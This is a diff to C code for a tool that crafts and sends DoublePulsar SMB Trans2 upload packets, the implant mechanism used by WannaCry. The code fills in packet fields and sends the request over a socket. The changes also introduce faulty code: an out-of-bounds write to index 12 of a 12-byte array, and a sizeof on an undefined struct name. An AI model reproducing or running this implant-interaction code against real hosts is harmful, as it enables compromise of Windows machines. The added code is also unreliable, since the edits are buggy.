@@ -107,7 +107,7 @@ typedef struct {
 	uint16_t ByteCount; //4109 or 0x0d 0x10
 	uint8_t padding;
 
-	char SESSION_SETUP_PARAMETERS[12]; //Wannacry uses 12 as the size but need NULL terminator
+	char SESSION_SETUP_PARAMETERS[12];
 } SMB_DOUBLEPULSAR_REQUEST;
 #pragma pack(pop)
 
@@ -209,7 +209,11 @@ int main(int argc, char* argv[])
 	uploadpacket.ProtocolHeader[2] = 'M';
 	uploadpacket.ProtocolHeader[3] = 'B';
 	uploadpacket.SmbCommand = 0x32; //Trans2 
-	uploadpacket.SmbMessageLength = SWAP_SHORT(0x4e);
+	
+	//fix here because the value needs to be dynamic not static
+	//uploadpacket.SmbMessageLength = SWAP_SHORT(0x4e);
+	uploadpacket.SmbMessageLength = sizeof(struct SMB_DOUBLEPULSAR_REQUEST);
+	
 	uploadpacket.ProcessIDHigh = 0x0000;
 	uploadpacket.NtStatus = 0x00000000;
 	uploadpacket.flags = 0x18;
@@ -251,6 +255,8 @@ int main(int argc, char* argv[])
 	uploadpacket.subcommand = 0x000e;         //original 0x0e00 ( little endian format )
 	uploadpacket.ByteCount = 0xD;          //value should be 13
 	uploadpacket.padding = SWAP_SHORT(0x00);			//should be 0x00
+	
+	//should probably reassign to 0x00 and not a NULL terminator
 	uploadpacket.signature[0] = '\0';
 	uploadpacket.signature[1] = '\0';
 	uploadpacket.signature[2] = '\0';
@@ -259,7 +265,9 @@ int main(int argc, char* argv[])
 	uploadpacket.signature[5] = '\0';
 	uploadpacket.signature[6] = '\0';
 	uploadpacket.signature[7] = '\0';
+	uploadpacket.signature[8] = '\0';
 
+	//should probably reassign to 0x00 and not a NULL terminator
 	uploadpacket.SESSION_SETUP_PARAMETERS[0] = '\0';
 	uploadpacket.SESSION_SETUP_PARAMETERS[1] = '\0';
 	uploadpacket.SESSION_SETUP_PARAMETERS[2] = '\0';
@@ -272,6 +280,7 @@ int main(int argc, char* argv[])
 	uploadpacket.SESSION_SETUP_PARAMETERS[9] = '\0';
 	uploadpacket.SESSION_SETUP_PARAMETERS[10] = '\0';
 	uploadpacket.SESSION_SETUP_PARAMETERS[11] = '\0';
+	uploadpacket.SESSION_SETUP_PARAMETERS[12] = '\0';
 
 	send(sock, (char*)&uploadpacket, sizeof(uploadpacket), 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
